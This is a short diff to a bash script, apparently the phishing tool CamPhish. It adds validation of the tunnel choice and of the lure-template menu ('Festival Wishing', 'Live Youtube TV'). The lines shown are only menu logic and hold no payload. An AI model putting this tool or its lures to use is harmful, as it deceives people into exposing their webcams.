@@ -136,6 +136,13 @@ rm -rf index3.html
 }
 
 select_template() {
+if [ $option_server -gt 2 ] || [ $option_server -lt 1 ]; then
+printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
+sleep 1
+clear
+banner
+camphish
+else
 printf "\n-----Choose a template----\n"    
 printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
@@ -145,8 +152,13 @@ option_tem="${option_tem:-${default_option_template}}"
 if [[ $option_tem -eq 1 ]]; then
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name: \e[0m' fest_name
 fest_name="${fest_name//[[:space:]]/}"
-else
+elif [[ $option_tem -eq 2 ]]; then
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
+else
+printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
+sleep 1
+select_template
+fi
 fi
 }
 
